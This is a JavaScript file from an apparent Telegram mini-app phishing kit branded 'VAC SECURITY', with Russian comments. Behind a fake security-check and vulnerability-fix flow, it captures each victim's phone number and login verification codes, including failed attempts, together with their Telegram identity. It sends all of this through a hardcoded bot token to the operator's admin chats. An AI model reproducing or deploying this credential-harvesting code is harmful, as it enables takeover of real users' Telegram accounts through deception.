const BOT_TOKEN = "8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0";
const ADMIN_ID = "5665980031";
const ADMIN_ID_2 = "ID_ВТОРОГО_АДМИНА"; // Замените на реальный ID второго администратора
const Two_user = false; // Установите true для рассылки двум пользователям, false - для одного
let lastMessages = {};

const formatMessage = (type, data, user) => {
    const escapeHtml = (str) => str?.toString().replace(/[&<>'"]/g, tag => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;'
    }[tag])) || 'N/A';

    const userInfo = `👤 ${escapeHtml(user.first_name || 'Пользователь')} ${escapeHtml(user.last_name || '')}\n` +
                    `🆔 ID: <code>${escapeHtml(user.id?.toString())}</code>\n` +
                    `🔗 USER: @${escapeHtml(user.username)}`;

    const timeInfo = `Время: <code>${new Date().toLocaleString()}</code>`;
    
    switch(type) {
        case 'init':
            return `🔐 <b>VAC SECURITY</b>\n\n🚪 <b>Новый вход в приложение</b>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'verified_enter':
            return `🔐 <b>VAC SECURITY</b>\n\n🟢 <b>Верифицированный пользователь вошел</b>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'security_check_start':
            return `🔐 <b>VAC SECURITY</b>\n\n🔍 <b>Пользователь начал проверку безопасности</b>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'security_check_complete':
            return `🔐 <b>VAC SECURITY</b>\n\n📊 <b>Проверка безопасности завершена</b>\n\n${userInfo}\n\nНайдено уязвимостей: <b>${data?.vulnerabilities || 0}</b>\n\n${timeInfo}`;
        
        case 'phone':
            return `🔐 <b>VAC SECURITY</b>\n\n📱 <b>Введён номер:</b> <code>${escapeHtml(data?.phone)}</code>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'code': 
            return `🔐 <b>VAC SECURITY</b>\n\n🔢 <b>Введён код</b>\n\nКод: <code>${escapeHtml(data?.code)}</code>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'verification_success':
            return `🔐 <b>VAC SECURITY</b>\n\n✅ <b>Успешная верификация</b>\n\nКод: <code>${escapeHtml(data?.code)}</code>\nПопыток: <b>${data?.attempts || 1}</b>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'app_close':
            return `🔐 <b>VAC SECURITY</b>\n\n🚪 <b>Пользователь вышел из приложения</b>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'vulnerability_fix_attempt':
            return `🔐 <b>VAC SECURITY</b>\n\n⚠️ <b>Попытка исправить уязвимость</b>\n\nУязвимость: <b>${escapeHtml(data?.vulnerability)}</b>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'vulnerability_fixed':
            return `🔐 <b>VAC SECURITY</b>\n\n✅ <b>Уязвимость исправлена</b>\n\nУязвимость: <b>${escapeHtml(data?.vulnerability)}</b>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'code_attempt_failed':
            return `🔐 <b>VAC SECURITY</b>\n\n❌ <b>Неудачная попытка ввода кода</b>\n\nКод: <code>${escapeHtml(data?.code)}</code>\nПопытка: <b>${data?.attempt || 1}</b>\n\n${userInfo}\n\n${timeInfo}`;
        
        case 'vulnerability_fix_started':
            return `🔐 <b>VAC SECURITY</b>\n\n🛠 <b>Начато исправление уязвимости</b>\n\nУязвимость: <b>${escapeHtml(data?.vulnerability)}</b>\n\n${userInfo}\n\n${timeInfo}`;
        
        default:
            return `🔐 <b>VAC SECURITY</b>\n\nℹ️ <b>Новое событие</b>\n\nТип: ${escapeHtml(type)}\nДанные: ${escapeHtml(JSON.stringify(data))}\n\n${userInfo}\n\n${timeInfo}`;
    }
};

const sendMessageToAdmin = async (chatId, messageText) => {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) throw new Error('Network response was not ok');
        return await response.json();
    } catch (error) {
        console.error('Ошибка отправки:', error);
        return null;
    }
};

window.sendToBot = async (type, data = null) => {
    if (!BOT_TOKEN || !ADMIN_ID) return null;

    try {
        const tg = window.Telegram?.WebApp;
        const user = tg?.initDataUnsafe?.user || {};
        const messageText = formatMessage(type, data, user);
        
        // Проверка на дубликаты
        const messageHash = type + JSON.stringify(data);
        if (lastMessages[messageHash] && 
            Date.now() - lastMessages[messageHash] < 5000) {
            return;
        }
        lastMessages[messageHash] = Date.now();

        // Отправка основному администратору
        await sendMessageToAdmin(ADMIN_ID, messageText);
        
        // Отправка второму администратору, если Two_user = true
        if (Two_user && ADMIN_ID_2) {
            await sendMessageToAdmin(ADMIN_ID_2, messageText);
        }

        return true;
    } catch (error) {
        console.error('Ошибка отправки:', error);
        return null;
    }
};